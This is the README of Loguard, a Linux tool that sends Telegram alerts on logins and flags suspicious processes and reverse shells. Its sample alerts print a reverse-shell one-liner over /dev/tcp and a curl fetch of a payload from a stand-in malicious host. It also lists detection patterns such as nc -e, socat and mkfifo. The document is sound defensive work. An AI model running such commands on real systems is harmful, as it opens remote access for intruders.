# 🔐 Loguard — Real-Time Linux Login Alerts to Telegram

Loguard is a minimal, tamper-resistant login monitor for Linux that delivers **instant Telegram notifications** whenever anyone logs in via SSH, console, sudo, su, or graphical login. It's designed for cloud servers, home labs, and production systems where every unauthorized login attempt needs to be caught *immediately*.

**Why Loguard?**
- ✅ **Zero network latency on login** — PAM hook writes to a local queue; Telegram delivery happens async
- ✅ **Session Monitoring (v2)** — every login is classified, tracked end-to-end, and scored for risk
- ✅ **Tamper detection** — Automatically alerts if someone tries to disable the monitor
- ✅ **No external dependencies** — Uses only `curl`, `ps`, and standard Linux PAM; no libcurl dev headers needed
- ✅ **Self-healing** — Watchdog timer automatically re-applies PAM rules if they get deleted
- ✅ **Rich alerts** — Shows IP geolocation, SSH method (key/password), emoji indicators, and more
- ✅ **Automatic retry queue** — Offline? Alerts wait and retry when connection returns
- ✅ **One-liner install** — Single bash script handles distro detection, build, and config

---

## 🆕 Session Monitor v2

Loguard v2 turns the original "login notifier" into a **Session Monitoring Agent**. Instead of one flat alert per login, every session now gets:

| Capability | What it does |
|---|---|
| **Session Classification** | Labels every login as Interactive SSH, Console, Privilege Escalation (sudo), User Switch (su), Graphical, System Session (cron), or Background Service (systemd) |
| **Session ID** | A unique ID per session; every event (login, process, logout) is correlated to it |
| **Rich initial alert** | UID/GID, home, shell, TTY, auth method, hostname, and (for remote logins) GeoIP: country, city, ISP |
| **Process Monitoring** | Polls `ps` every few seconds for new processes under the session's TTY/user |
| **Suspicious Process Alerts** | Flags `curl`, `wget`, `nc`, `python`, `perl`, `php`, `docker`, `kubectl`, etc. spawned mid-session |
| **Reverse Shell Detection** | Pattern-matches `bash -i`, `nc -e`, `/dev/tcp/`, `socket.socket()`, `socat`, `mkfifo`, and similar one-liners |
| **Privilege Escalation Alerts** | Dedicated alert whenever `sudo`/`su`/`pkexec` is used |
| **Risk Engine** | Numeric score built from every event in the session; crossing the threshold fires an immediate HIGH RISK alert |
| **Session Summary** | On logout: full timeline, processes seen, privilege escalation flag, and final risk score |
| **Noise Reduction** | `cron`/`systemd`/`anacron`/`at` housekeeping sessions are logged locally but never sent to Telegram |

**Not included in this version** (reserved for a future update, see `src/risk_engine.hpp`):
- ❌ File integrity monitoring (`/etc/passwd`, `authorized_keys`, `sshd_config`, etc.)
- ❌ Network connection monitoring (active socket/connection tracking)

---

## 🚀 Quick Start

### 1. Create a Telegram Bot

```bash
# Message @BotFather on Telegram:
/newbot

# Name your bot (e.g., "My Server Monitor") and copy the Bot Token
# Start a chat with your new bot: /start

# Get your Chat ID by messaging @userinfobot
```

### 2. Install Loguard

```bash
# One-liner (downloads and installs from GitHub):
curl -fsSL https://raw.githubusercontent.com/Nowafen/Loguard/main/install.sh | sudo bash

# Or clone and install locally:
git clone https://github.com/Nowafen/Loguard.git
cd Loguard
sudo bash install.sh
```

During installation, you'll be prompted for:
- **Bot Token** — from @BotFather
- **Chat ID** — from @userinfobot (a number like `123456789`)
- **Device label** — how you want this server identified in alerts (e.g., "prod-db-1")

### 3. Test It

```bash
sudo loguard test
# A test message should arrive in your Telegram chat immediately
```

### 4. Check Status

```bash
loguard status
# Shows daemon health, PAM hook status, pending alerts, etc.
```

---

## 📱 Alert Examples

These are the *exact* formats the daemon builds (see `session.cpp` / `main.cpp`) — not mockups.

### 1) Initial alert — Interactive SSH login
```
🔐 Interactive Remote Login
━━━━━━━━━━━━━━━━━━━━
👤 User
root (uid=0)

🌍 Source
23.251.47.254
🇩🇪 Germany / Frankfurt
🏢 Hetzner Online GmbH

💻 Host
SSH_Ubuntu

🔑 Auth
Unknown

🖥 Shell
/bin/bash

📟 TTY
pts/3

🕒 Time
2026-07-23 10:38:11

🆔 Session
37b94815042cd08b
━━━━━━━━━━━━━━━━━━━━
Risk: 🟢 LOW (10)
```

### 2) Privilege Escalation (sudo used mid-session)
```
🔴 Privilege Escalation
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root
⬆️ sudo bash
📟 pts/3
━━━━━━━━━━━━━━━━━━━━
Risk: +15 (total 25)
```

### 3) Suspicious process mid-session
```
⚠️ Suspicious Process
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root
📋 curl http://malicious.com/payload.sh
📍 PID: 18271
━━━━━━━━━━━━━━━━━━━━
Risk: +20 (total 45)
```

### 4) Reverse shell detected (immediate high-severity alert)
```
🔴 REVERSE SHELL DETECTED ⚠️
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root
❌ bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
📍 PID: 18299
━━━━━━━━━━━━━━━━━━━━
Risk: 🔴 HIGH (+100, total 145)
```

### 5) Session Summary (sent automatically at logout)
```
📋 Session Summary
━━━━━━━━━━━━━━━━━━━━
🆔 37b94815042cd08b
👤 root (uid=0)
🌍 23.251.47.254 🇩🇪 Germany
⏱ Duration: 45m 23s
━━━━━━━━━━━━━━━━━━━━
🕐 Timeline
10:38 Login
10:38 SSH Login (+10)
10:42 sudo bash
10:42 Privilege escalation via sudo (+15)
10:45 vim /etc/ssh/sshd_config
11:23 Logout

⚙️ Processes
bash sudo vim

🔐 Privilege Escalation: Yes
⚠️ Suspicious Events: 0
🌐 Network Connections: 0
━━━━━━━━━━━━━━━━━━━━
📊 Risk Score
SSH Login +10
Privilege escalation via sudo +15
─────────
Total: 🟡 MEDIUM (25)
```

### 6) Cron / systemd noise — no Telegram alert at all
Sessions classified as **System Session** (cron/anacron/at) or **Background Service** (systemd) are recorded in `/var/log/loguard/sessions.log` but are never sent to Telegram — this is exactly what fixed the "constant cron pings" issue:
```
2026-07-23 07:24:16 | START 9f2c... | System Session | user=root tty=cron ...
```

---

## 🎯 What Loguard Monitors

| Login Type | Monitored | Classification | Notes |
|---|---|---|---|
| SSH login (key or password) | ✅ Yes | Interactive Remote Login | GeoIP, risk score, full session tracking |
| Console / physical access | ✅ Yes | Console Login | Local login shown |
| `sudo` elevation | ✅ Yes | Privilege Escalation | Dedicated 🔴 alert |
| `su` elevation | ✅ Yes | User Switch | Tracked as its own session |
| `cron`, `at`, `anacron` scheduled jobs | ⏭️ Logged only | System Session | Never sent to Telegram (fixes cron noise) |
| `systemd` service activation | ⏭️ Logged only | Background Service | Never sent to Telegram |
| Graphical login (X11, Wayland) | ✅ Yes | Graphical Login | Lightdm, GDM, SDDM |
| FTP, IMAP, or other services | ❌ No | — | Use a separate service-specific tool |

### Automatic Filters (No-Noise Design)

The **PAM hook itself** (not just the daemon) never even writes an event for:
- `cron`, `crond`, `anacron`, `at`, `atd`, `batch`
- `systemd`, `systemd-user`

This is what stops the "New Login Detected / Service: cron" noise entirely — those events never reach the queue, let alone Telegram.

Everything else (including root logins, sudo, su) is tracked as a full Session. If you want different filtering, edit the noise lists in `src/pam_hook.c` (`noise_services[]`) and rebuild.

---

## 🛠️ Commands

```bash
loguard status              # Full health report
loguard enable              # Turn on monitoring
loguard disable             # Pause all alerts (keeps config)
loguard test                # Send a test message
loguard edit                # Interactive config wizard
loguard logs [n]            # Show last n delivery attempts (default: 20)
loguard sessions [n]        # Show last n session start/end log lines (default: 40)
loguard queue               # Show pending unsent alerts
loguard clear-queue         # Discard all pending alerts
loguard check               # Run one watchdog pass
loguard update              # Check for and install updates
loguard restart             # Disable and re-enable (refreshes PAM)
loguard uninstall           # Remove everything (asks for confirmation)
loguard help                # Show all commands
```

---

## 🔒 Security Architecture

### How It Works

1. **PAM Hook** (`loguard-notify`) — Fires on session **open and close**
   - On open: classifies the session, generates a Session ID, gathers UID/GID/home/shell/TTY/source IP, and writes a `session_start` event
   - On close: pops the matching Session ID from a per-TTY stack (correctly handles nested sessions, e.g. `sudo` inside an SSH session) and writes a `session_end` event
   - Writes to `/var/lib/loguard/sessions/events.jsonl` (fast, non-blocking, no network)
   - `cron`/`systemd` housekeeping never generates an event at all

2. **Daemon** (`loguardd`) — Runs in background
   - Drains session events, classifies them, looks up GeoIP for remote IPs (cached), sends the initial rich alert
   - Polls `ps` every few seconds (configurable) for new processes under each active session's TTY + user
   - Runs every new process through the suspicious-binary list and reverse-shell pattern matcher
   - Maintains a running Risk Score per session; crossing the threshold fires an immediate HIGH RISK alert
   - Sends the full Session Summary at logout
   - Sends alerts to Telegram with automatic retry via the same queue used for tamper alerts
   - Sends periodic heartbeat messages (so a silent death is noticed)

3. **Watchdog** (`loguard check`, runs every minute via systemd timer)
   - Verifies the daemon is alive
   - Checks that PAM rules are still in place
   - Verifies binary integrity (SHA-256)
   - If problems found, sends an immediate alert + auto-heals PAM

### Why This Design?

- **Network-independent PAM hook** — A slow Telegram API or GeoIP lookup never delays login
- **`ps`-based process tracking, not eBPF/auditd** — Zero extra kernel privileges or dependencies; the tradeoff is a few-second polling delay instead of instant kernel-level notification
- **Retry queue** — Transient network failures don't lose alerts
- **Self-healing** — If someone disables monitoring via PAM edit, the watchdog catches it and re-applies it within 60 seconds
- **Integrity checks** — If binaries are replaced, it's detected and alerted
- **Tamper alerts** — A gap in heartbeats or PAM rules missing triggers a dedicated alert

### What It Can't Protect Against

- **Attacker with full root + physical access to disk** — Can wipe everything
- **Attacker with kernel module access** — Can hook system calls before PAM
- **Network layer tampering** — If Telegram API is compromised (rare)
- **Sub-poll-interval activity** — A process that starts and exits faster than `process_poll_seconds` can be missed by the `ps`-based monitor (a future eBPF/auditd collector would close this gap)

**Reality:** Loguard makes quietly disabling alerts *hard*. It doesn't require 24/7 perfect security, just that alerts can't be silently muted without leaving a trace.

---

## 📊 File Locations

```
Config:               /etc/loguard/config.toml
PAM manifest:         /etc/loguard/pam_manifest.list
Integrity hashes:     /etc/loguard/integrity.sha256

Daemon binary:        /opt/loguard/bin/loguard
PAM hook binary:      /opt/loguard/bin/loguard-notify
CLI symlink:          /usr/local/bin/loguard

Alert log:            /var/log/loguard/alert.log
Tamper/health log:    /var/log/loguard/tamper.log
Session log:          /var/log/loguard/sessions.log
Suspicious log:       /var/log/loguard/suspicious.log
Pending queue:        /var/lib/loguard/queue.jsonl
PID file:             /run/loguard/loguard.pid

Session events:       /var/lib/loguard/sessions/events.jsonl
Per-TTY session stack: /var/lib/loguard/sessions/by_tty/
GeoIP cache:          /var/lib/loguard/sessions/geo_cache.jsonl
Seen-countries list:  /var/lib/loguard/sessions/seen_countries.list

Systemd units:        /etc/systemd/system/loguard*.{service,timer}
OpenRC init:          /etc/init.d/loguard
```

---

## 🔧 Advanced Configuration

Edit `/etc/loguard/config.toml`:

```toml
# Loguard configuration
bot_token = "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
chat_id   = "987654321"
hostname  = "prod-db-1"
os_info   = "Ubuntu 24.04 LTS (x86_64)"

# Heartbeat: send "I'm alive" message every N minutes (0 = disabled)
heartbeat_minutes = 15

# Auto-heal: if PAM rules get deleted, re-apply them automatically
self_heal_pam = true

# Session Monitor v2 settings
process_poll_seconds = 5     # how often `ps` is scanned for new processes per session
enable_geoip = true          # country/city/ISP lookups for remote IPs (via ip-api.com)
high_risk_threshold = 100    # immediate alert fires once a session's risk score reaches this
```

Changing these values only requires editing the file and running `sudo systemctl restart loguard` — no rebuild needed.

### Rebuild After Code Changes

If you modify the noise lists, suspicious-binary list, or reverse-shell patterns in the C/C++ source, rebuild:

```bash
cd /path/to/Loguard
sudo bash install.sh
```

(`install.sh` always rebuilds from the local source tree if run from inside the repo.)

---

## 🚨 Troubleshooting

### Alerts Not Arriving

1. **Check config validity:**
   ```bash
   sudo loguard status
   ```
   Look for "Config: valid" line. If not valid, re-run:
   ```bash
   sudo loguard edit
   sudo loguard test
   ```

2. **Check daemon is running:**
   ```bash
   sudo systemctl status loguard
   ```
   If not running:
   ```bash
   sudo systemctl start loguard
   ```

3. **Check network connectivity:**
   ```bash
   curl -I https://api.telegram.org
   ```
   If it fails, your server can't reach Telegram's API. Contact your ISP or cloud provider.

4. **Check the queue:**
   ```bash
   loguard queue
   ```
   If there are pending messages, they'll be delivered once the daemon and network are OK.

### False Alerts from Cron/System

`cron`, `anacron`, `at`, `atd`, `batch`, `systemd`, and `systemd-user` are filtered **at the PAM hook itself** — no event is even written for them, so they should never reach Telegram. If you're still seeing noise from a *different* service:

1. Identify the noisy service:
   ```bash
   loguard sessions 50
   # Look for repeated START lines with the same service
   ```

2. Add it to `noise_services[]` in `src/pam_hook.c`

3. Rebuild:
   ```bash
   sudo bash install.sh
   ```

### Too Many / Too Few Suspicious-Process Alerts

The suspicious-binary list and reverse-shell patterns live in `src/pattern_matcher.cpp`:
- `suspicious_binaries()` — binaries that trigger a ⚠️ alert (curl, wget, nc, python, ...)
- `looks_like_reverse_shell()` — substrings that trigger an immediate 🔴 alert (`bash -i`, `nc -e`, `/dev/tcp/`, ...)

Edit either list and rebuild with `sudo bash install.sh`.

### "TAMPER ALERT" Messages

If you see PAM hook warnings:

1. **Check what's wrong:**
   ```bash
   sudo loguard status
   ```
   Look for "Integrity: PROBLEM DETECTED" or "PAM hook: TAMPERED"

2. **Re-apply the PAM rules:**
   ```bash
   sudo loguard restart
   ```

3. **Check integrity:**
   ```bash
   sudo loguard check
   ```

If the watchdog keeps complaining after a restart, your PAM files may be readonly or permission-locked. Check manually:

```bash
sudo ls -la /etc/pam.d/common-session
sudo grep loguard-notify /etc/pam.d/common-session
```

---

## 🏗️ Building from Source

### Prerequisites
- Linux kernel 5.0+ (any distro)
- `g++` (C++17 support)
- `gcc` (C support)
- `curl` (runtime, for Telegram + GeoIP lookups)
- `ps` / procps (runtime, for Session Monitor process tracking)
- `make`

### Build Steps

```bash
git clone https://github.com/Nowafen/Loguard.git
cd Loguard

# Build binaries
g++ -std=c++17 -O2 -o bin/loguard \
    src/main.cpp src/util.cpp src/config.cpp \
    src/telegram.cpp src/queue.cpp src/pam.cpp src/integrity.cpp \
    src/session.cpp src/session_queue.cpp \
    src/geoip.cpp src/risk_engine.cpp \
    src/pattern_matcher.cpp src/process_monitor.cpp

gcc -O2 -o bin/loguard-notify src/pam_hook.c

# Install
sudo install -m 0755 bin/loguard /opt/loguard/bin/loguard
sudo install -m 0755 bin/loguard-notify /opt/loguard/bin/loguard-notify
sudo ln -sf /opt/loguard/bin/loguard /usr/local/bin/loguard

# Setup systemd units, config, etc.
sudo bash install.sh
```

### Why No libcurl?

Loguard spawns `curl` as a subprocess instead of linking `libcurl`. Benefits:

- ✅ No build-time dependency on libcurl-dev headers (which vary by distro)
- ✅ Smaller, simpler binary
- ✅ Curl invocations use an argv vector (not a shell string), so bot tokens can never be shell-injected
- ✅ Curl's SSL/TLS is battle-tested; no reinventing certificate validation

Downside: ~1ms slower per Telegram send (negligible for async delivery).

---

## 📈 Monitoring Multiple Servers

Each server runs an independent Loguard instance. All alerts go to the **same Telegram chat ID**, so you get one unified stream.

**Example setup:**

```bash
# Server 1: prod-db-1
LOGUARD_BOT_TOKEN=xxx LOGUARD_CHAT_ID=123456789 \
  LOGUARD_HOSTNAME=prod-db-1 sudo bash install.sh

# Server 2: prod-db-2
LOGUARD_BOT_TOKEN=xxx LOGUARD_CHAT_ID=123456789 \
  LOGUARD_HOSTNAME=prod-db-2 sudo bash install.sh

# Server 3: staging-web-1
LOGUARD_BOT_TOKEN=xxx LOGUARD_CHAT_ID=123456789 \
  LOGUARD_HOSTNAME=staging-web-1 sudo bash install.sh
```

All alerts arrive in one chat, with each server identified by its hostname label. Easily spot which server had the login.

---

## 🔄 Updates

Loguard can self-update from GitHub Releases:

```bash
sudo loguard update
```

This:
1. Checks GitHub Releases for a newer version
2. Verifies the binary checksum against the published `SHA256SUMS`
3. Replaces the binary atomically
4. Restarts the daemon

If a checksum fails, the update is aborted (safer than deploying a potentially compromised binary).

---

## 📜 License

MIT License — See LICENSE file for details.

---

## 🙋 Feedback & Contributions

Found a bug? Have an idea?

- **GitHub Issues:** https://github.com/Nowafen/Loguard/issues
- **Discussions:** https://github.com/Nowafen/Loguard/discussions

Contributions welcome! For major changes, please open an issue first.

---

## ⚠️ Disclaimer

Loguard is a **best-effort** login monitor. It is **not a substitute** for:
- Regular security audits
- Proper SSH key management
- Firewall rules and network segmentation
- System hardening and kernel updates
- 24/7 security monitoring services

Use it as part of a *layered defense* strategy, not your only defense.

---

**Happy monitoring! 🚀**